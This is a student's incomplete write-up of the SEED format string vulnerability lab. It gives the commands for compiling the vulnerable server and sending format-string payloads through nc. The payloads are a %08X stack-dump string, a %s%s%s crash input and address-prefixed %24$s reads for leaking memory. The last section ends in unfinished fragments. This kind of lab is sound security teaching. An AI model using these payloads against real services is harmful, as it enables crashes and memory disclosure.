---
title:  Format String Vulnerability Lab 
author: Xinyi Li
date: \today{}
---

# Task 1

Use the default `DUMMY_SIZE` as 100.

```bash
gcc -z execstack -o server server.c
```

Then clone the current VM according to [this manual](https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf) as the server, whose IP address is `10.0.2.4`. While the client VM has an IP address as `10.0.2.15`.


On the server VM run

```bash
sudo ./server
```
Immediately, it is blocked with
```
The address of the input array: 0xbffff0e0
The address of the secret: 0x08048870
The address of the 'target' variable: 0x0804a044
The value of the 'target' variable (before): 0x11223344
```

On the client VM run

```bash
echo hello | nc -u 10.0.2.4 9090
```

And the server VM prints:
```
The ebp value inside myprintf() is: 0xbfffee28
hello
The value of the 'target' variable (after): 0x11223344
```

# Task 2

```bash
python -c 'print "AAAA"+"%08X."*40' > badfile
nc -u 10.0.2.4 9090 < badfile
```

1. 0xbffff0e0+150 = 0xBFFFF176
2. 0xbffff038+4 = 0xBFFFF03C
3.

# Task 3

send any illegal format string to the server. the server will crash.

For instance,

```bash
echo %s%s%s | nc -u 10.0.2.4 9090
```

The server will print an error message (`Segmentation fault`) and exit.

# Task 4

## Task 4 A

send a long `%x.` series. The server prints

```
0.64.b7fff918.804a014.b7fe97a2.b7fffad0.bffff0e0.1.bffff038.
```
`bffff038` is the address of `ebp` in `myprintf`.

## Task 4 B

```bash
python -c 'print "\x30\xee\xff\xbf%24$s"' > badfile
nc -u 10.0.2.4 9090 < badfile
```

python -c 'print "\x08\x04\x88\x70%24$s"' > badfile
0xbfffee30






